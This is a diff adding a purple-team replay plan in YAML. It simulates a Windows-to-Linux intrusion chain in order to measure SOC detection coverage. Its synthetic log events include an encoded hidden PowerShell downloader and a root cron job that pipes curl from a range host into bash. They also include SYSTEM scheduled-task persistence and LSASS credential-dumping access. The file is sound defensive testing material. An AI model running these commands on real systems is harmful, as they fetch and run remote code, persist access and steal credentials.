@@ -1,0 +1,159 @@
+# =============================================================================
+# SPARKSOC replay plan — representative intrusion chain across the range.
+#
+# Used by:  python3 purple_replay.py replay --plan plans/apt-chain.yaml
+#
+# Each step becomes (a) a ground-truth event and (b), unless `stealth: true`,
+# a synthetic Splunk alert. Stealth steps model techniques your range does not
+# instrument — they SHOULD be missed, and a plan with none of them produces a
+# flattering detection rate that tells you nothing.
+# =============================================================================
+name: "Replay — Windows intrusion chain with Linux pivot"
+match_window_seconds: 900
+
+steps:
+
+  - technique_id: T1566.001
+    name: "Spearphishing attachment"
+    target_host: WIN11-RANGE-04
+    stealth: true          # no email telemetry on this range
+    notes: "Initial access is not instrumented; expected miss."
+
+  - technique_id: T1204.002
+    name: "User execution of malicious file"
+    target_host: WIN11-RANGE-04
+    search_name: "SPARKSOC - Suspicious PowerShell Execution"
+    severity: high
+    delay_seconds: 6
+    results:
+      - _time: "replay"
+        host: WIN11-RANGE-04
+        User: "CORP\\jdoe"
+        Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+        CommandLine: "\"WINWORD.EXE\" /n \"C:\\Users\\jdoe\\Downloads\\Q3-Invoice.docm\""
+        ParentImage: "C:\\Windows\\explorer.exe"
+
+  - technique_id: T1059.001
+    name: "PowerShell — encoded downloader"
+    target_host: WIN11-RANGE-04
+    search_name: "SPARKSOC - Suspicious PowerShell Execution"
+    severity: high
+    delay_seconds: 8
+    results:
+      - _time: "replay"
+        host: WIN11-RANGE-04
+        User: "CORP\\jdoe"
+        Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        CommandLine: "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADkAMAAuADkAOQAuADUALwBzAC4AcABzADEAJwApAA=="
+        ParentImage: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+        Hashes: "SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53"
+
+  - technique_id: T1547.001
+    name: "Run key persistence"
+    target_host: WIN11-RANGE-04
+    search_name: "SPARKSOC - Persistence Mechanism Created"
+    severity: high
+    delay_seconds: 10
+    results:
+      - _time: "replay"
+        host: WIN11-RANGE-04
+        User: "CORP\\jdoe"
+        EventCode: "13"
+        TargetObject: "HKU\\S-1-5-21-1004\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveSync"
+        Details: "C:\\Users\\jdoe\\AppData\\Roaming\\odsync.exe"
+        Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+
+  - technique_id: T1055.001
+    name: "DLL injection into explorer"
+    target_host: WIN11-RANGE-04
+    stealth: true
+    notes: "No CreateRemoteThread rule deployed; expected miss."
+
+  - technique_id: T1003.001
+    name: "LSASS memory dump"
+    target_host: WIN11-RANGE-04
+    search_name: "SPARKSOC - Credential Dumping Indicators"
+    severity: critical
+    delay_seconds: 12
+    results:
+      - _time: "replay"
+        host: WIN11-RANGE-04
+        User: "CORP\\jdoe"
+        SourceImage: "C:\\Users\\jdoe\\AppData\\Roaming\\odsync.exe"
+        TargetImage: "C:\\Windows\\system32\\lsass.exe"
+        GrantedAccess: "0x1410"
+        CallTrace: "C:\\Windows\\SYSTEM32\\ntdll.dll+9d234|UNKNOWN(00007FFB2C1E0000)"
+
+  - technique_id: T1018
+    name: "Remote system discovery"
+    target_host: WIN11-RANGE-04
+    search_name: "SPARKSOC - Suspicious PowerShell Execution"
+    severity: medium
+    delay_seconds: 8
+    results:
+      - _time: "replay"
+        host: WIN11-RANGE-04
+        User: "CORP\\jdoe"
+        Image: "C:\\Windows\\System32\\net.exe"
+        CommandLine: "net view /domain"
+        ParentImage: "C:\\Users\\jdoe\\AppData\\Roaming\\odsync.exe"
+
+  - technique_id: T1021.006
+    name: "WinRM lateral movement to server"
+    target_host: WS2022-RANGE-02
+    search_name: "SPARKSOC - Lateral Movement Indicators"
+    severity: high
+    delay_seconds: 12
+    results:
+      - _time: "replay"
+        host: WS2022-RANGE-02
+        User: "CORP\\Administrator"
+        Logon_Type: "3"
+        Source_Network_Address: "10.90.11.4"
+        Image: "C:\\Windows\\System32\\wsmprovhost.exe"
+        CommandLine: "C:\\Windows\\system32\\wsmprovhost.exe -Embedding"
+        count: "4"
+
+  - technique_id: T1053.005
+    name: "Scheduled task on server"
+    target_host: WS2022-RANGE-02
+    search_name: "SPARKSOC - Persistence Mechanism Created"
+    severity: high
+    delay_seconds: 10
+    results:
+      - _time: "replay"
+        host: WS2022-RANGE-02
+        User: "CORP\\Administrator"
+        EventCode: "4698"
+        TaskName: "\\Microsoft\\Windows\\WindowsUpdate\\SyncCheck"
+        Image: "C:\\Windows\\System32\\schtasks.exe"
+        CommandLine: "schtasks /create /tn \"WindowsUpdate\\SyncCheck\" /tr \"powershell -nop -w hidden -f C:\\ProgramData\\sync.ps1\" /sc minute /mo 15 /ru SYSTEM /f"
+        ParentImage: "C:\\Windows\\System32\\wsmprovhost.exe"
+
+  - technique_id: T1053.003
+    name: "Cron persistence on RHEL pivot"
+    target_host: RHEL-RANGE-11
+    search_name: "SPARKSOC - Linux Suspicious Activity"
+    severity: high
+    delay_seconds: 14
+    results:
+      - _time: "replay"
+        host: RHEL-RANGE-11
+        user: root
+        comm: bash
+        exe: /usr/bin/bash
+        cmdline: "bash -c 'echo \"*/5 * * * * root curl -s http://10.90.99.5/p.sh | bash\" >> /etc/cron.d/systemd-update'"
+        syscall: execve
+        key: persistence
+
+  - technique_id: T1071.001
+    name: "HTTP C2 beacon"
+    target_host: WS2022-RANGE-02
+    stealth: true
+    notes: "No network-based detection content deployed; expected miss."
+
+  - technique_id: T1041
+    name: "Exfiltration over C2 channel"
+    target_host: WS2022-RANGE-02
+    stealth: true
+    notes: "Expected miss — measures the blind spot at the end of the chain."
